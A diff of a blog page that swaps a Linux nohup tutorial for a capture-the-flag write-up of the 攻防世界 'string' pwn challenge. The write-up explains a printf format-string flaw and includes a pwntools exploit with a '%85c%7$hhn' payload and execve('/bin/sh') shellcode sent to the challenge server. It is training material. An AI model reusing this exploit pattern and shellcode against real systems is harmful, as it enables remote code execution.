@@ -23,30 +23,41 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"nuxm.gitee.io","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.10.0","exturl":true,"sidebar":{"position":"right","display":"hide","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
 
-  <meta name="description" content="前言如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。">
+  <meta name="description" content="前言看了半天才完全看懂，我太菜了">
 <meta property="og:type" content="website">
-<meta property="og:title" content="nohup命令">
-<meta property="og:url" content="https://nuxm.gitee.io/Linux/nohup%E5%91%BD%E4%BB%A4/index.html">
+<meta property="og:title" content="攻防世界-string">
+<meta property="og:url" content="https://nuxm.gitee.io/D&D/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/index.html">
 <meta property="og:site_name" content="This —&gt; 昊">
-<meta property="og:description" content="前言如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。">
+<meta property="og:description" content="前言看了半天才完全看懂，我太菜了">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2022/02/24/y64tCrmuJcsxA98.png">
-<meta property="article:published_time" content="2022-02-23T02:55:56.062Z">
-<meta property="article:modified_time" content="2022-02-24T06:18:45.954Z">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/9BfFEq2nxNMGgha.jpg">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/kAlCEnJW5cItYhX.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/zGV4kEbBK6MFhdH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/dFbASI2gfquo1Hl.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/nxJm851hlgsdIGH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/cMpjYonTDkWVAsE.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/9ikWMPQwpITAZy3.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/VOsouYUzf6QwJxK.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/lOUF8RC7wn9JHGD.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/02/ByVwobOZNFc2lfE.png">
+<meta property="article:published_time" content="2022-03-02T02:31:17.598Z">
+<meta property="article:modified_time" content="2022-03-02T02:41:57.964Z">
 <meta property="article:author" content="昊">
-<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2022/02/24/y64tCrmuJcsxA98.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/03/02/9BfFEq2nxNMGgha.jpg">
 
 
-<link rel="canonical" href="https://nuxm.gitee.io/Linux/nohup%E5%91%BD%E4%BB%A4/">
+<link rel="canonical" href="https://nuxm.gitee.io/D&D/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://nuxm.gitee.io/Linux/nohup%E5%91%BD%E4%BB%A4/","path":"Linux/nohup命令/","title":"nohup命令"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://nuxm.gitee.io/D&D/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/","path":"D&D/攻防世界-string/","title":"攻防世界-string"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>nohup命令 | This —> 昊</title>
+<title>攻防世界-string | This —> 昊</title>
   
 
 
@@ -154,7 +165,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">命令简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%B8%BE%E4%BE%8B"><span class="nav-number">3.</span> <span class="nav-text">使用举例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%80%E5%87%BA%E4%BB%BB%E5%8A%A1"><span class="nav-number">4.</span> <span class="nav-text">退出任务</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -220,7 +231,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://nuxm.gitee.io/Linux/nohup%E5%91%BD%E4%BB%A4/">
+    <link itemprop="mainEntityOfPage" href="https://nuxm.gitee.io/D&D/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/2222.png">
@@ -233,7 +244,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          nohup命令
+          攻防世界-string
         </h1>
 
         <div class="post-meta-container">
@@ -243,15 +254,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2022-02-23 10:55:56" itemprop="dateCreated datePublished" datetime="2022-02-23T10:55:56+08:00">2022-02-23</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-02-24 14:18:45" itemprop="dateModified" datetime="2022-02-24T14:18:45+08:00">2022-02-24</time>
+      <time title="创建时间：2022-03-02 10:31:17 / 修改时间：10:41:57" itemprop="dateCreated datePublished" datetime="2022-03-02T10:31:17+08:00">2022-03-02</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -259,7 +264,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%8C%87%E4%BB%A4/" itemprop="url" rel="index"><span itemprop="name">指令</span></a>
+          <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">二进制安全</span></a>
         </span>
     </span>
 
@@ -273,22 +278,32 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
-<p><a href="https://sm.ms/image/y64tCrmuJcsxA98" target="_blank"><img src="https://s2.loli.net/2022/02/24/y64tCrmuJcsxA98.png" ></a></p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看了半天才完全看懂，我太菜了</p>
+<p><a href="https://sm.ms/image/9BfFEq2nxNMGgha" target="_blank"><img src="https://s2.loli.net/2022/03/02/9BfFEq2nxNMGgha.jpg" ></a></p>
 <span id="more"></span>
 
-<h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nohup Command [ Arg … ] [ &amp; ]</span><br></pre></td></tr></table></figure>
+<p>老规矩，先分析一下文件</p>
+<p><a href="https://sm.ms/image/kAlCEnJW5cItYhX" target="_blank"><img src="https://s2.loli.net/2022/03/02/kAlCEnJW5cItYhX.png" ></a></p>
+<p>分析了很多次就不多说了。</p>
+<p>然后用64位IDA打开，从题目名字可猜测，是一道格式化字符串漏洞的题，所以等下<code>print()</code>着重看一下。</p>
+<p>可以在Linux中先将程序跑一遍，对程序的流程和分支有个大概了解。本题是个简单的<code>D&amp;D类型题目</code>。</p>
+<p>用IDA对程序进行分析，顺着程序的流程走，可以看到在<code>sub_400BB9</code>中有<code>printf(&amp;format, &amp;format)</code>语句，存在格式化字符串漏洞。</p>
+<p><a href="https://sm.ms/image/zGV4kEbBK6MFhdH" target="_blank"><img src="https://s2.loli.net/2022/03/02/zGV4kEbBK6MFhdH.png" ></a></p>
+<p>此外，在函数<code>sub_400CA6</code>中，可以发现<code>_QWORD</code>的分支有命令执行的语句，可以直接执行外部输入的命令。</p>
+<p><a href="https://sm.ms/image/dFbASI2gfquo1Hl" target="_blank"><img src="https://s2.loli.net/2022/03/02/dFbASI2gfquo1Hl.png" ></a></p>
+<p>因此，本题的关键在于，如何利用格式化字符串漏洞，让程序的控制流进入到命令执行语句；也就是说，进入<code>sub_400CA6</code>函数中，且满足<code>*a == a1[1]</code>的条件。</p>
+<p>IDA进行具体分析：</p>
+<p><a href="https://sm.ms/image/nxJm851hlgsdIGH" target="_blank"><img src="https://s2.loli.net/2022/03/02/nxJm851hlgsdIGH.png" ></a></p>
+<p><a href="https://sm.ms/image/cMpjYonTDkWVAsE" target="_blank"><img src="https://s2.loli.net/2022/03/02/cMpjYonTDkWVAsE.png" ></a></p>
+<p><a href="https://sm.ms/image/9ikWMPQwpITAZy3" target="_blank"><img src="https://s2.loli.net/2022/03/02/9ikWMPQwpITAZy3.png" ></a></p>
+<p><a href="https://sm.ms/image/VOsouYUzf6QwJxK" target="_blank"><img src="https://s2.loli.net/2022/03/02/VOsouYUzf6QwJxK.png" ></a></p>
+<p>使用Pwngdb在<code>printf(&amp;format, &amp;format)</code> 处设置断点，输入<code>0x052345</code>，在栈顶的第二个8字节，根据64位程序的传参方式，该地址是格式化字符串的第 7 个参数，<code>printf()</code> 函数的第 8 个参数。</p>
+<p><a href="https://sm.ms/image/lOUF8RC7wn9JHGD" target="_blank"><img src="https://s2.loli.net/2022/03/02/lOUF8RC7wn9JHGD.png" ></a></p>
+<p>由此可以得到EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># context(terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./string&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">58455</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">v3_addr = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v3_addr = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + v3_addr, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(v3_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;name be:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;east or up?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;east&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;leave(0)?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;\&#x27;Give me an address\&#x27;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;you wish is:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%85c%7$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;I will help you! USE YOU SPELL&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。<code>nohup</code>就是不挂起的意思（<code>no hang up</code>）。</p>
-<p><code>nohup</code> 运行由 <code>Command</code> 和相关的 <code>Arg</code> 参数指定的命令，忽略所有挂断（<code>SIGHUP</code>）信号。要运行后台中的 <code>nohup</code> 命令，添加 <code>&amp;</code> （ 表示 <code>and</code> 的符号）到命令的尾部。</p>
-<p>如果使用 <code>nohup</code> 命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为 nohup.out 的文件中，除非另外指定了输出文件。</p>
-<h1 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
 
-<p>在上面的例子中，运行命令 <code>java -jar adapter-minisite.jar</code> 输入参数 <code>/tomcat-1</code> 和 <code>/tomcat-2</code>，输出被重定向到 <code>logs.txt</code> 文件中。</p>
-<h1 id="退出任务"><a href="#退出任务" class="headerlink" title="退出任务"></a>退出任务</h1><p>如果运行的任务在当前 <code>shell</code> 终端，可以通过 <code>jobs</code> 命令查询相关信息，并且杀掉进程。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前 shell 终端的后台运行任务进程信息</span><br><span class="line">$ jobs</span><br><span class="line">[1]+ Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># 杀掉任务号</span><br><span class="line">$ kill %1</span><br><span class="line"></span><br><span class="line"># 或着找到 pid</span><br><span class="line">$ jobs -l</span><br><span class="line">[1]+ 11076 Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">$ kill 11076</span><br><span class="line"></span><br><span class="line"># 或着</span><br><span class="line">$ fg %n # 置为前端运行</span><br><span class="line"></span><br><span class="line">Ctrl + c # 退出</span><br></pre></td></tr></table></figure>
-
-<p>如果非当前 <code>shell</code> 终端，可以通过 <code>ps auxf | grep adapter-minisite</code> 获取 <code>pid</code> 然后 <code>kill pid</code>。</p>
+<p><a href="https://sm.ms/image/ByVwobOZNFc2lfE" target="_blank"><img src="https://s2.loli.net/2022/03/02/ByVwobOZNFc2lfE.png" ></a></p>
 
     </div>
 
@@ -298,21 +313,20 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
+              <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"><i class="fa fa-tag"></i> 栈溢出</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/%E7%9F%A5%E8%AF%86%E6%A0%91/JAVA/" rel="prev" title="JAVA知识点整理">
-                  <i class="fa fa-chevron-left"></i> JAVA知识点整理
+                <a href="/%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94leve2/" rel="prev" title="攻防世界—level2">
+                  <i class="fa fa-chevron-left"></i> 攻防世界—level2
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/Linux/Linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/" rel="next" title="Linux简单总结">
-                  Linux简单总结 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -365,7 +379,7 @@
 
 
   <script src="https://cdn.jsdelivr.net/npm/quicklink@2.2.0/dist/quicklink.umd.js" integrity="sha256-4kQf9z5ntdQrzsBC3YSHnEz02Z9C1UeW/E9OgnvlzSY=" crossorigin="anonymous"></script>
-  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":false,"archive":false,"delay":true,"timeout":3000,"priority":true,"url":"https://nuxm.gitee.io/Linux/nohup%E5%91%BD%E4%BB%A4/"}</script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":false,"archive":false,"delay":true,"timeout":3000,"priority":true,"url":"https://nuxm.gitee.io/D&D/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/"}</script>
   <script src="/js/third-party/quicklink.js"></script>
 
 </body>
